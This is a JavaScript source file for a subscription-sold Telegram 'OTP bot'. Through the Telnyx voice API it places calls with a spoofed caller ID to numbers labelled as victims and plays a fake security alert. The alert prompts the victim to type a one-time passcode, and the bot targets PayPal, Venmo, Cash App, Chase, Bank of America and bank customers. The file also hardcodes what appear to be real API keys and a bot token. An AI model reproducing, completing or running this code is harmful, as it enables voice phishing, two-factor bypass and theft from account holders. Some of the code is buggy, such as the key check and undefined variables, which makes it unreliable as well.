// TELNYX STUFF 
const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
const service_number = '+14342338629'
const WEBHOOK_URL = 'https://ofbtc.onrender.com';
const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'

const connection_id = '2307488084473677329' //did not work
const app_id = '2307620830302962752'

const telnyx = require('telnyx')(MY_API_KEY);
const { Telegraf } = require('telegraf'); // importing telegraf.js
var bot = new Telegraf(bot_token)

const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]


var sqlite3 = require('sqlite3');
var db = new sqlite3.Database('db.sqlite3');

var table = `CREATE TABLE IF NOT EXISTS entries (
   user_key TEXT PRIMARY KEY,
   user TEXT NOT NULL,
   duration INTEGER NOT NULL
 )`;

db.run( table, [], function(err) {
   if (err) {
     console.error(err.message);
   } else {
     console.log('Table created successfully');
   }
});


// Define a function to insert a new entry into the table
function insertEntry(user_key, user, duration, ctx) {
   var sql = `INSERT INTO entries (user_key, user, duration) VALUES (?, ?, ?)`;
   var params = [user_key, user, duration];
 
   db.run(sql, params, function(err) {
     if (err) {
         console.error(err.message);
     } else {
         bot.telegram.sendMessage(ctx.chat.id, `your generted key is - ${user_key} for ${duration}`)
     }
   });
}

function updateEntry(user_key, user, ctx) {
   var sql = `UPDATE entries SET user = ? WHERE user_key = ?`;
   var params = [user, user_key];
 
   db.run(sql, params, function(err) {
     if (err) {
       console.error(err.message);
     } else {
         bot.telegram.sendMessage(ctx.chat.id, `welcome to OFBTC OTP BOT. Type /checktime to see how long you have left`)
     }
   });
}

function allowedUser(user_key) {
   var sql = `SELECT * FROM entries WHERE user_key = ?`;
   var params = [user_key];
   var result;

   db.get(sql, params, function(err, row) {
     if (err) {
       console.error(err.message);
     } else {
       if (row) {
         result = true;
       } else {
         result = false
      }
     }
   });

   return result
}

insertEntry('admin', '2020524303', 12, {})


// Defined a list of allowed users (using IDs) 
const adminUsers = ['2020524303', '0']

// Defined a middleware function that checks the user 
const userFilter = (ctx, next) => {
   // Get the user from the context 
   const user = ctx.from.id 
   console.log(user, adminUsers[0])
   if ( allowedUser(user) || adminUsers.includes(`${user}`) ) {
      return next() 
   } else { 
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Restricted command, Purchase key`, {}).then(() => {})
      return null
   } 
}

const adminFilter = (ctx, next) => {
   // Get the user from the context 
   const user = ctx.from.id
   if (adminUsers.includes(user)) {
      return next() 
   } else { 
      return null 
   } 
}

// bot is not making the calls. possible solution could be to recharge balance

async function call (spoof, customer_number, ctx, service, name, digit){
   // console.log('command is from: ', ctx.from)

   try {
      const { data: connection } = await telnyx.connections.retrieve('2307488084473677329');
      console.log('your connections are: ', connection)

      const { data: call } = await telnyx.calls.create({
         connection_id: '2307620830302962752',
         to: `+${customer_number}`,
         from: service_number,
         from_display_name: `+${spoof}`,
         answering_machine_detection: 'detect'
      }); 



      await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
         reply_markup:{
            inline_keyboard: [
               [
                  {
                     text: 'End Call',
                     callback_data: 'end'
                  }               
               ]
            ]
         }
      }) 
      bot.action('end', ctx => {
         ctx.telegram.sendMessage(ctx.from.id, `❌ Call ended`, {})
         // call.hangup()
      } )
   } catch (error) {
      console.log("your error is: ", error.message)
   }

}

// BOT INITIALIZATION
bot.on('start', ctx => {
   console.log(ctx.from)
   bot.telegram.sendMessage(
      ctx.chat.id, `
      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
      ➤ Type: /purchase to subscribe \n 
      👤 USER COMMANDS 👤 \n
      ➤ /redeem - Redeem your key\n
      ➤ /checktime - Check subscription time left\n\n
      📞 CALL COMMANDS 📞 \n 
      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
      ➤ /bank - Capture bank OTP\n
      ➤ /boa - Capture boa OTP\n
      ➤ /chase - Capture chase OTP\n
      ➤ /wellsfargo - Capture Wells fargo OTP\n
      ➤ /venmo - Capture venmo OTP\n
      ➤ /paypal - Capture bank OTP\n      
      `, {})
})

bot.help(ctx => ctx.reply(`
   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
➤ Type: /purchase to subscribe \n 
👤 USER COMMANDS 👤 \n
➤ /redeem - Redeem your key\n
➤ /checktime - Check subscription time left\n\n
📞 CALL COMMANDS 📞 \n 
➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
➤ /bank - Capture bank OTP\n
➤ /boa - Capture boa OTP\n
➤ /chase - Capture chase OTP\n
➤ /wellsfargo - Capture Wells fargo OTP\n
➤ /venmo - Capture venmo OTP\n
➤ /paypal - Capture bank OTP\n
`))


// ADMIN COMMANDS
bot.command('new_key', adminFilter, ctx => {
   const [key, duration] = ctx.message.text.split(' ');
   let newKey = Math.floor(Math.random())* 9999
   insertEntry( newKey, '', duration, ctx)
})


//  USER COMMANDS
bot.command('auth_key', ctx => {
   const [auth, key] = ctx.message.text.split(' ');
   updateEntry(key, ctx.from.id, ctx)
})

bot.command('redeem', ctx => {
   const [auth, key] = ctx.message.text.split(' ');
   updateEntry(key, ctx.from.id, ctx)
})

bot.command('checktime', ctx => {
   let duration = ''
   //TODO - check DATABASE duration'
   bot.telegram.sendMessage(ctx.chat.id, `you have left ${duration} left`)
})


// USER RESTRICTED COMMANDS
bot.command('call', userFilter, ctx => {
   const [command, spoof, number, service, name, digit ]= ctx.message.text.split(' ');
   const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]

   if( !number || !serviceList.includes(service) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${service}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, service, name, 6)
   }


})

bot.command('paypal', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('venmo', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('boa', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('chase', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('cashapp', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.command('bank', userFilter, ctx => {
   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');

   if( !number || !serviceList.includes(command) ){
      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
   }
   else{
      bot.telegram.sendMessage(ctx.chat.id, 
         `
✅ CALL STARTING\n 
✅ SPOOF NUBER - ${spoof}\n 
✅ VICTIM NUBER - ${number}\n 
✅ SERIVCE - ${command}\n
✅ OTP DIGIT - ${digit} 
         `, {})

      call(spoof, number, ctx, command, name, 6)
   }


})

bot.launch();


// webhook urls
app.post('/webhooks', (req, res) => {
   const call_control_id = req.body.data.call_control_id;

   telnyx.calls.gather_using_speak(
      {
         call_control_id: call_control_id,
         payload: `There has been a login to your account from an unknown location, press 1 if this was not you`, 
         language: 'en-US', 
         voice: 'female',
         webhook_url: `${ WEBHOOK_URL }/webhooks/pressed_one` 
      }
   )
   
});

app.post('/webhooks/pressed_one', (req, res) => {
   // Get the call_control_id from the webhook data
   const call_control_id = req.body.data.call_control_id;
   const result = req.body.data.payload.result; 


   call.gather_using_speak(
   { 
      call_control_id: call_control_id,
      payload: `We have just sent you a one time password, kindly type the ${digit} digit code`, 
      language: 'en-US', 
      voice: 'female',
      webhook_url: `${ WEBHOOK_URL }/webhooks/typed_code` 
   });
})

app.post('/webhooks/typed_code', (req, res) => {
   const digits = req.body.digits;
   res.json(req.body)


});
 

app.listen(port, () => {
   console.log(`Server running on port ${port}`);
});
 

